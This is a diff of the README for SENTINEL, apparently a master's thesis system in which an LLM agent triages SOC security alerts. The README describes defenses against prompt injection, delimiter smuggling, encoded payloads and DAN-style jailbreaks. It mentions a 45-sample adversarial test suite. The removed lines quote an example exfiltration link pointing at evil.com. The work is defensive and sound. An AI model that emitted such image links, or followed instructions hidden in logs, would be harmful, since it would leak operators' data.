@@ -7,182 +7,226 @@
 
 > **SENTINEL** = **S**treaming **E**vents **N**etwork for **T**hreat **I**ntelligence, **N**eutralization, **E**scalation and **L**og-correlation
 
-A Cognitive Two-Tier Architecture for SOC automation that integrates Session-Aware Behavioral Baselining (Tier 1) with an Agentic AI driven by Dual-RAG and Long-Term Threat Memory (Tier 2). Built as a Master's Thesis to solve the SOC Alert Fatigue paradox.
+SENTINEL is an enterprise-grade Cognitive Two-Tier Architecture designed for Security Operations Center (SOC) automation. It addresses the **SOC Alert Fatigue Paradox** by combining real-time, low-latency heuristic filtering at Tier 1 with an advanced Agentic AI reasoning pipeline driven by Dual-RAG, Threat Memory, and graph correlation at Tier 2.
 
-## Architecture Overview
+---
 
-SENTINEL uses a **2-Tier Funneling Architecture** with strict **Separation of Concerns**:
+## 📐 Architecture Overview
+
+SENTINEL operates on a strict **Separation of Concerns** model to minimize processing latency while maintaining deep cognitive analytical capabilities:
 
 ```text
-CSE-CIC-IDS2018 / DAPT2020
-        │
-  Data Publisher → Redis Stream
-        │
-  TIER 1 ─ Rule Engine (Session-Aware Behavioral Baselining + IP Blacklist + TTL Eviction)
-        │
-        ├── benign → [ DROP ]
-        │
-        └── anomalous → GUARDRAIL LAYER
-                           ├── 1. Drain3 Template Mining (Volume Compression)
-                           └── 2. Delimited Data Encapsulation (Anti-Injection)
-                                    │
-                              TIER 2 ─ LangGraph Agent
-                                    │
-                              ┌─────┴─────┐
-                        MITRE ATT&CK    NIST 800-61r2
-                        FAISS Index 1   FAISS Index 2
-                        (TTP mapping)   (IR playbook)
-                              └─────┬─────┘
-                                    │
-                              Gemma-2-9B-IT (llama.cpp, Q4_K_M)
-                                    │
-                         ┌──────────┼──────────┐
-                     BLOCK_IP   QUARANTINE    ALERT
-                         │          │           │
-                     Executor   HITL Queue   Dashboard
-                                    │
-                         ┌──────────┘
-                    Feedback Loop → Dynamic Rule Hot-Reload → Tier 1
+                     CSE-CIC-IDS2018 / DAPT2020 / Syslogs
+                                     │
+                               [ Redis Stream ]
+                                     │
+    ┌────────────────────────────────┴────────────────────────────────┐
+    │ TIER 1 - Heuristic Rule Engine & Session-Aware Behavioral Baselining │
+    └────────────────────────────────┬────────────────────────────────┘
+                                     ├─ Benign (F1=1.0) ──> [ DROP ] (Noise Reduction)
+                                     └─ Anomalous
+                                             │
+    ┌────────────────────────────────────────┴────────────────────────────────┐
+    │ GUARDRAILS & PRE-PROCESSING LAYER                                       │
+    │  1. Nonce-based Delimited Data Encapsulation (Anti Prompt-Injection)   │
+    │  2. Encoding Neutralization (URL, Base64, Hex decoding & sanitization)  │
+    │  3. Jailbreak & DAN Detector (Critical isolation)                       │
+    │  4. Drain3 Log Template Miner (Token compression)                       │
+    └────────────────────────────────────────┬────────────────────────────────┘
+                                             │
+    ┌────────────────────────────────────────┴────────────────────────────────┐
+    │ TIER 2 - LangGraph Agentic Reasoning (Gemma-2-9B-IT Q4_K_M via llama.cpp)│
+    └────────────────────┬────────────────────────────────┬───────────────────┘
+                         │                                │
+        ┌────────────────┴────────────────┐      ┌────────┴────────┐
+        │     Dual-RAG Knowledge Retrieval│      │  Threat Memory  │
+        │ - MITRE ATT&CK (TTP mapping)    │      │ - SQLite Store  │
+        │ - NIST SP 800-61r2 (Playbooks)  │      │ - APT Linker    │
+        │ - FAISS + BM25 Hybrid Search   │      └────────┬────────┘
+        └────────────────┬────────────────┘               │
+                         └────────────────┬───────────────┘
+                                          │
+                                [ LangGraph Workflow ]
+                                          │
+                        ┌─────────────────┼─────────────────┐
+                  (Decision: ALERT) (Decision: QUARANTINE) (Decision: BLOCK_IP)
+                        │                 │                 │
+                  [ Dashboard ]     [ HITL Queue ]    [ Response Executor ]
+                        │                 │                 │
+                        └───────── Approved? ───────────────┘
+                                          │
+                                   [ Feedback Loop ]
+                                          │
+                            (Dynamic Rule Hot-Reload)
+                                          │
+                                     [ Tier 1 ]
 ```
 
-### Core Modules
+### Core Architecture Modules
 
-| # | Component | Role | Layer | Tech Stack |
-|---|---|---|---|---|
-| **1** | Rule Engine & Session Baseline | Heuristic filter — DROP noise at wire speed | Tier 1 | Python + Redis |
-| **2** | Template Miner (Drain3) | Volume Compression ONLY — reduce tokens | Guardrails | Drain3 (simplified) |
-| **3** | Prompt Injection Defense | Delimited Data Encapsulation + Encoding Neutralization | Guardrails | `secrets.token_hex()` |
-| **4** | Dual-RAG (FAISS + BM25) | Hybrid Search with Reciprocal Rank Fusion | Tier 2 (RAG) | `sentence-transformers` + `faiss-cpu` + `rank_bm25` |
-| **5** | LangGraph Agent | Deep analysis, MITRE mapping, action decisions | Tier 2 (Agent) | LangGraph + Gemma-2-9B-IT |
-| **6** | Threat Memory | Persistent IP reputation + APT correlation | Tier 2 (Memory) | SQLite |
-| **7** | HITL Dashboard | SOC operator interface + rule approval queue | UI | Streamlit + RBAC |
+| ID | Component | Layer | Technology Stack | Core Role |
+| :--- | :--- | :--- | :--- | :--- |
+| **1** | **Rule Engine & Session Baseline** | Tier 1 | Python + Redis | Real-time stateless/stateful log filtering. Drops benign events at wire-speed. |
+| **2** | **Guardrails Defenses** | Pre-processing | Regex + Delimiter Deliters | Delimited Data Encapsulation, Encoding Neutralization, Jailbreak defense. |
+| **3** | **Drain3 Template Miner** | Pre-processing | Python Drain3 | Compresses high-volume syslog and network stream tokens before LLM input. |
+| **4** | **Dual-RAG Hybrid Search** | Tier 2 (RAG) | FAISS + BM25 + RRF | Fetches context from MITRE ATT&CK and NIST SP 800-61r2 using hybrid indexes. |
+| **5** | **LangGraph Agent** | Tier 2 (Reasoning) | LangGraph + Gemma-2-9B-IT | Orchestrates cognitive threat analysis, TTP mapping, and mitigation actions. |
+| **6** | **Threat Memory** | Tier 2 (Memory) | SQLite + Correlation Engine | Tracks long-term host behaviors, correlating multi-day APT attack chains (DAPT2020). |
+| **7** | **HMAC Log Chaining** | Integrity | SQLite + HMAC SHA-256 | Cryptographically chains audit logs. Automatically flags DB tampering. |
+| **8** | **Persistent Lockout** | Auth Security | SQLite + SHA-256 + Timeouts | Persistent brute-force protection (max 5 attempts, 60s lockout) with usability auto-reset. |
+| **9** | **Trivy & Neo4j KB Graph** | Vulnerability | Neo4j + Trivy + Graphviz | Scans system files and links vulnerabilities into an interactive threat knowledge graph. |
+| **10**| **HITL Streamlit Dashboard** | UI/UX | Streamlit + Glassmorphism | SOC Operator control panel, live monitoring, log auditor, and whitelist controls. |
 
-## 🛡️ Core Novelty & Defenses
+---
 
-### Delimited Data Encapsulation (Adversarial Defense)
-- **Dynamic Randomized Delimiters:** Each request generates a new delimiter using `secrets.token_hex()`. Prevents *Delimiter Smuggling*.
-- **Encoding Neutralization:** Intercepts Base64/Hex/URL-encoded/Unicode before LLM inference.
-- **Jailbreak Detection:** Pattern-based + behavioral scoring for DAN/roleplay-style attacks.
+## 🛡️ Core Security Novelty & Defensive Controls
 
-### HITL Quarantine (Adversarial Rule Injection Defense)
-- Agent auto-generates new rules but they are placed in **Quarantine (Pending Approval)**.
-- Streamlit Dashboard with RBAC routes rules to L3 Manager before hot-reloading into Tier 1.
+SENTINEL implements defense-in-depth, protecting both the protected infrastructure and the AI system itself from adversarial threats:
 
-### Output Sanitizer (Data Exfiltration Defense)
-- Strips Markdown/HTML image tags from LLM output to prevent indirect data exfiltration via `![](https://evil.com/steal?data=...)`.
+### 1. Adversarial AI Protection (LLM Guardrails)
+* **Delimited Data Encapsulation:** Wraps raw log payloads in dynamic, single-use cryptographic delimiters (`secrets.token_hex(16)`) to isolate instruction from data. Strips any nested delimiter tokens in raw inputs to prevent **Delimiter Smuggling**.
+* **Encoding Neutralizer:** Decodes and sanitizes Base64, Hex, URL, and Unicode homoglyph payloads prior to analysis, neutralising obfuscation bypass techniques.
+* **Jailbreak Detection:** Real-time analysis of incoming payloads against signature-based and semantic patterns associated with "Do-Anything-Now" (DAN) roleplay-based attacks.
+* **Output Sanitizer:** Prevents **Indirect Prompt Injection (Data Exfiltration)** by stripping markdown image links (`![](...)`) and malicious HTML/JavaScript tags generated by the LLM from entering the operator UI.
 
-## 📊 5D Evaluation Framework (v2_5D)
+### 2. Infrastructure & Audit Trail Hardening
+* **Cryptographic Audit Trail (HMAC Log Chaining):** Logs written to `audit_trail.db` are chained using HMAC-SHA-256 (like a private blockchain). The hash of each log entry depends on the hash of the preceding entry. Any database modification by an intruder breaks the chain and triggers an alert.
+* **Persistent Lockout & Lockout Auto-Reset:** Protection against credential brute-forcing stored in SQLite (resistant to session clearing or private window bypass). Once the lockout duration expires, the system automatically resets attempts to `0` for seamless usability.
+* **Clickjacking & CSRF Prevention:** Streamlit configuration hardened with `enableCORS = false`, `enableXsrfProtection = true`, and `frameAncestors = ["'none'"]` to prevent unauthorized iframe embedding.
 
-| Dimension | Target | Statistical Test | Script |
-|---|---|---|---|
-| **1. Classification** | F1 ≥ 0.90 | McNemar's Test (p<0.05) | `experiments/run_ablation_study.py` |
-| **2. Operational** | Latency Reduction ≥ 60% | Mann-Whitney U Test (p<0.05) | `experiments/measure_latency_baseline.py` |
-| **3. Robustness** | Guardrail Defeat Rate < 10% | 45 curated adversarial samples | `experiments/evaluate_robustness.py` |
-| **4. Context Quality** | RAGAS Context Relevance ≥ 0.85 | Cross-family LLM-as-Judge (Llama-3.1-8B judges Gemma-2-9B) | `experiments/evaluate_reasoning.py` |
-| **5. Explainability** | Audit Trail Completeness 100% | Deterministic field presence check | `experiments/evaluate_reasoning.py` |
+### 3. Vulnerability Management & RAG Integrity
+* **RAG Document Checksum Auditor:** Dynamically validates the integrity of raw MITRE ATT&CK and NIST SP 800-61r2 sources using SHA-256 hashing. Prevents document poisoning attacks.
+* **Trivy static scan & Neo4j graph representation:** Runs automated container scans on requirements/Dockerfiles, populating a Neo4j Graph DB and visualising structural vulnerabilities dynamically in the UI.
+
+---
+
+## 📊 5-Dimensional Evaluation Framework (5D-EF)
+
+SENTINEL is systematically benchmarked across five analytical axes:
+
+| Axis | Metric / Target | Statistical Evaluation | Verification Script |
+| :--- | :--- | :--- | :--- |
+| **1. Classification** | F1-Score $\ge 0.90$ (Triage accuracy) | McNemar's Test ($p < 0.05$) | `experiments/run_ablation_study.py` |
+| **2. Operational** | Latency Reduction $\ge 60\%$ (Tier 1 filter rate)| Mann-Whitney U Test ($p < 0.05$) | `experiments/measure_latency_baseline.py` |
+| **3. Robustness** | Guardrail Bypass Rate $< 10\%$ | 45-sample Adversarial Suite | `experiments/evaluate_robustness.py` |
+| **4. Context Quality**| Context Relevance $\ge 0.85$ (RAG context) | LLM-as-a-Judge (Llama 3.1) | `experiments/evaluate_reasoning.py` |
+| **5. Explainability**| Completeness Index $= 100\%$ (Audit Trail) | Deterministic schema checks | `experiments/evaluate_reasoning.py` |
+
+---
 
 ## 📂 Datasets
 
-| Dataset | Purpose | Size |
-|---|---|---|
-| **CSE-CIC-IDS2018** | Tier 1 network traffic (14 attack types + benign) | ~16M rows, 10 CSV files |
-| **DAPT2020** | Tier 2 APT multi-day attack chains | 5 days, 7,276 rows, 197 chains |
-| **MITRE ATT&CK** | RAG Index 1 — tactical TTP mapping | FAISS + BM25 index |
-| **NIST SP 800-61r2** | RAG Index 2 — incident response playbook | 193 vectors, IR-phase-specific |
-| **Ground Truth** | Evaluation benchmark | 750 samples, 15 classes |
-| **Adversarial Samples** | Guardrail robustness testing | 45 samples, 3 categories |
+* **CSE-CIC-IDS2018:** Employs millions of rows of network traffic capturing 14 distinct attack classes (SSH brute-force, DDoS, Web attacks, etc.) to evaluate Tier 1 filtering.
+* **DAPT2020:** A multi-day Advanced Persistent Threat (APT) dataset containing 197 distinct attack chains to validate the SQLite Threat Memory.
+* **MITRE ATT&CK & NIST SP 800-61r2:** Curated textual databases indexed into FAISS vector indexes and BM25 lexicons for hybrid semantic search.
 
-## 📁 Project Structure
+---
 
-```
+## 📁 Directory Structure
+
+```text
 AI_Security_Graph/
 ├── config/
-│   ├── ablation/                     # 6 YAML configs (A-F) for ablation study
-│   ├── system_settings.yaml          # Central config (Tier1, Guardrails, RAG, Redis)
-│   ├── audit_trail.db                # SQLite audit trail (auto-created)
-│   └── threat_memory.db              # SQLite threat memory (auto-created)
+│   ├── ablation/                     # 6 configuration files (A-F) for Ablation studies
+│   ├── system_settings.yaml          # Core configuration file (Tier 1 thresholds, DB locations)
+│   ├── audit_trail.db                # SQLite audit trail DB (auto-generated)
+│   └── threat_memory.db              # SQLite threat memory DB (auto-generated)
 ├── data/
-│   ├── raw/cicids2018/               # CSE-CIC-IDS2018 CSV files
-│   ├── raw/dapt2020/                 # DAPT2020 APT dataset (5 days)
-│   ├── knowledge/                    # NIST 800-61r2 source PDF/TXT
-│   └── processed/                    # DAPT2020 pre-built chains
+│   ├── raw/cicids2018/               # Network traffic CSV captures
+│   ├── raw/dapt2020/                 # Day-by-day APT events
+│   ├── knowledge/                    # Source PDF/TXT playbooks for RAG
+│   └── processed/                    # Structured APT chains
 ├── experiments/
-│   ├── adversarial/                  # 3 attack categories with samples
-│   ├── ground_truth.json             # 750 evaluation samples
-│   ├── adversarial_samples.json      # 45 adversarial test samples
-│   ├── run_ablation_study.py         # Ablation study (6 configs)
-│   ├── evaluate_robustness.py        # Guardrail defeat rate evaluation
-│   ├── evaluate_reasoning.py         # Cross-family LLM-as-Judge
-│   ├── statistical_tests.py          # McNemar + Mann-Whitney U
-│   ├── measure_latency_baseline.py   # Two-Tier vs LLM-only latency
-│   └── e2e_test_runner.py            # 20 component validation tests
+│   ├── adversarial/                  # Curated prompt injection, jailbreaks, and obfuscations
+│   ├── ground_truth.json             # 750 samples benchmark set
+│   ├── adversarial_samples.json      # 45 adversarial test vectors
+│   ├── run_ablation_study.py         # Runs ablation tests across A-F configs
+│   ├── evaluate_robustness.py        # Benchmarks LLM Guardrails
+│   ├── evaluate_reasoning.py         # Runs LLM-as-a-Judge evaluation
+│   ├── measure_latency_baseline.py   # Latency comparison (Tier 1 vs Tier 2 bypass)
+│   └── e2e_test_runner.py            # Automated E2E integration test suite
 ├── knowledge_base/
-│   ├── mitre_attack.json             # MITRE ATT&CK knowledge source
-│   ├── nist_800_61r2.json            # NIST 800-61r2 knowledge source
-│   └── faiss_index/                  # FAISS + BM25 indexes (6 files)
+│   ├── mitre_attack.json             # Structured MITRE TTPs
+│   ├── nist_800_61r2.json            # Structured NIST incident response playbooks
+│   └── faiss_index/                  # Embedded FAISS and BM25 vector indexes
 ├── src/
-│   ├── streaming/                    # Redis Pub/Sub (publisher.py, subscriber.py)
-│   ├── tier1_filter/                 # Rule Engine + Session Baseline + Feedback Loop
-│   ├── guardrails/                   # Template Miner + Prompt Filter + Output Sanitizer
-│   ├── rag/                          # Dual-RAG Retriever + Embedder + Semantic Cache
-│   ├── agent/                        # LangGraph Workflow + Nodes + LLM Client + Threat Memory
-│   ├── response/                     # Action Executor + Audit Trail
-│   └── ui/                           # Streamlit Dashboard + RBAC Auth
+│   ├── streaming/                    # Publisher/Subscriber message broker (Redis Streams)
+│   ├── tier1_filter/                 # Rule engine, session monitor & feedback logic
+│   ├── guardrails/                   # Prompt-injection, jailbreak, & XSS sanitization
+│   ├── rag/                          # Embedders, FAISS database client, RAG caching
+│   ├── agent/                        # LangGraph workflow engine, agent states, LLM APIs
+│   ├── response/                     # Action executor, DB client, lockout, & HMAC log signer
+│   └── ui/                           # Glassmorphism Streamlit UI & authentication logic
 ├── tests/
-│   ├── unit/                         # Unit tests (pytest)
-│   └── integration/                  # Integration tests
-├── main.py                           # CLI entry point (--mode server|scan|full)
+│   ├── unit/                         # Pytest unit tests
+│   └── integration/                  # End-to-end flow tests
+├── main.py                           # Application CLI entrypoint
 ├── requirements.txt                  # Python dependencies
-├── Dockerfile                        # Container build
-└── docker-compose.yml                # Full infrastructure stack
+├── Dockerfile                        # Application containerization
+└── docker-compose.yml                # Microservices orchestration (Neo4j, Redis, MLflow, LLM)
 ```
+
+---
 
 ## 🚀 Quick Start
 
-See [RUN_PROJECT.md](RUN_PROJECT.md) for detailed step-by-step instructions.
+For detailed step-by-step instructions on deploying the full stack, please consult [RUN_PROJECT.md](RUN_PROJECT.md).
 
-### 1. Setup Environment
+### 1. Environment Setup
 ```bash
+# Clone the repository
 git clone https://github.com/Binhchuoizzz/AI_Security_Graph.git
 cd AI_Security_Graph
+
+# Create and activate a Python 3.10 virtual environment
 python3.10 -m venv .venv
 source .venv/bin/activate
+
+# Install dependencies
 pip install -r requirements.txt
+
+# Configure environment variables
 cp .env.example .env
 ```
 
-### 2. Build RAG Indexes (First Time Only)
+### 2. Initialize RAG Vectors
 ```bash
 python src/rag/embedder.py
 ```
 
-### 3. Run E2E Validation (No LLM Required)
+### 3. Run E2E Integration Suite (Offline Mode)
 ```bash
 python experiments/e2e_test_runner.py --offline
 ```
 
-### 4. Run Full Pipeline (Requires Redis + LLM Server)
+### 4. Deploy Infrastructure & Start Server
 ```bash
-docker-compose up -d redis
-# Start llama.cpp server with Gemma-2-9B-IT on port 5000
+# Spin up Neo4j, Redis, MLflow and llama.cpp CUDA server
+docker-compose up -d
+
+# Start the SENTINEL streaming subscriber
 python main.py --mode server
 ```
 
-### 5. Launch HITL Dashboard
+### 5. Launch the SOC Dashboard
 ```bash
 streamlit run src/ui/app.py
 ```
 
-## 💻 Hardware Requirements
+---
 
-| Component | Minimum | Details |
-|---|---|---|
-| GPU | NVIDIA RTX 4060 Ti 16GB VRAM | Gemma-2-9B-IT Q4_K_M (~6GB) + KV Cache |
-| RAM | 32GB | Streaming cache + FAISS indexes |
-| OS | Linux (Ubuntu 22.04+) | — |
+## 💻 System & Hardware Requirements
 
-## 📝 License & Authorship
+* **GPU:** Nvidia RTX 4060 Ti 16GB VRAM (minimum) / RTX 4090 (recommended) for hosting the quantized Gemma-2-9B-IT model.
+* **RAM:** 32 GB.
+* **OS:** Linux (Ubuntu 22.04 LTS or newer).
+* **Storage:** 50 GB SSD storage.
 
-MIT License. See [LICENSE](LICENSE) for details.
+---
 
-**Author**: Nguyễn Đức Bình — Master's Candidate in AI & Machine Learning.
+## 📄 License & Authorship
+
+Distributed under the MIT License. See `LICENSE` for details.
+
+* **Author:** Nguyễn Đức Bình
+* **Academic Context:** Master's Thesis — AI & Machine Learning Specialization.
